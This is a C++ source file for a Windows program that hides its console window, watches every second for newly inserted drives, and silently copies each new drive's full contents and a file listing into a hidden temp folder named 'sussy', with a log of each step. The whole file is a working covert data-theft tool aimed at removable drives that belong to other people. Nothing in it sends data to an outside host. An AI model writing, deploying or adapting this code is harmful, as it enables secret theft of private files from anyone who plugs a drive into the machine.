#include "ID.hpp"
#include <bitset>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <spdlog/sinks/basic_file_sink.h>
#include <spdlog/spdlog.h>
#include <sstream>
#include <thread>

#ifdef PLATFORM_WINDOWS
    #include <Windows.h>
#endif

using std::bitset;
namespace fs = std::filesystem;

i8 get_new_drive_letter(bitset<32>);
fs::path path_from_letter(i8);
void copy_files(fs::path drive_path, fs::path out_path);
void dump_tree(fs::path in_path, fs::path out_file);
bitset<32> get_devices();
void initialize_logger();

static bitset<32> s_current_drives{0};
const static fs::path work_dir = fs::temp_directory_path() / "sussy";
Ref<spdlog::logger> logger;

int main() {

#ifdef PLATFORM_WINDOWS
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
#endif

    fs::create_directories(work_dir);
    initialize_logger();

    s_current_drives = get_devices();

    logger->info("Init was successful, starting now.");

    while (true) {
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(1s);

        logger->info("Looking for devices...");

        auto new_drives = get_devices();
        if (new_drives != s_current_drives) {
            i8 letter = get_new_drive_letter(new_drives);
            if (letter != 0) {
                ID id;
                logger->warn("{:c}:\\ was found! Assigned ID is {}", letter,
                             id);
                auto drive_path = path_from_letter(letter);
                fs::path out_path = work_dir / id.ToString();
                fs::create_directories(out_path);

                logger->info("Dumping tree");
                dump_tree(drive_path, out_path / "tree_dump.txt");

                copy_files(drive_path, out_path);
            }

            s_current_drives = new_drives;
        }
    }

    return 0;
}

i8 get_new_drive_letter(bitset<32> new_drives) {
    for (size_t i = 0; i < s_current_drives.size(); i++) {

        if (s_current_drives[i] != new_drives[i]) {
            // Check if device was removed and not inserted
            if (new_drives[i] == 0)
                return 0;

            return (i8)('A' + i);
        }
    }
    return 0;
}

void dump_tree(fs::path in_path, fs::path out_file) {
    std::ofstream dump(out_file);

    for (const fs::directory_entry &entry :
         fs::recursive_directory_iterator(in_path)) {

        if (entry.is_regular_file())
            dump << entry.path() << std::endl;
    }
}

void copy_files(fs::path drive_path, fs::path out_path) {
    logger->info("Copying to {}", out_path.string());

    try {
        fs::copy(drive_path, out_path, fs::copy_options::recursive);
        logger->info("Done!");
    } catch (...) {
        logger->error("Copy was interrupted, trying to save progress");
        auto out_file = out_path / "recovery_dump.txt";
        dump_tree(out_path, out_file);
        logger->info("Progress was saved to {}", out_file.string());
    }
}

bitset<32> get_devices() {
#ifdef PLATFORM_WINDOWS
    return GetLogicalDrives();
#else
    // Just make it compile
    return 0;
#endif
}

void initialize_logger() {
#ifdef PLATFORM_WINDOWS
    logger = spdlog::basic_logger_st("logger", (work_dir / "log.txt").string());
#else
    logger = spdlog::basic_logger_st("logger", (work_dir / "log.txt"));
#endif

    logger->flush_on(spdlog::level::trace);
}

fs::path path_from_letter(i8 letter) {
    std::stringstream ss;
    ss << letter << ":\\";
    return fs::path(ss.str());
}
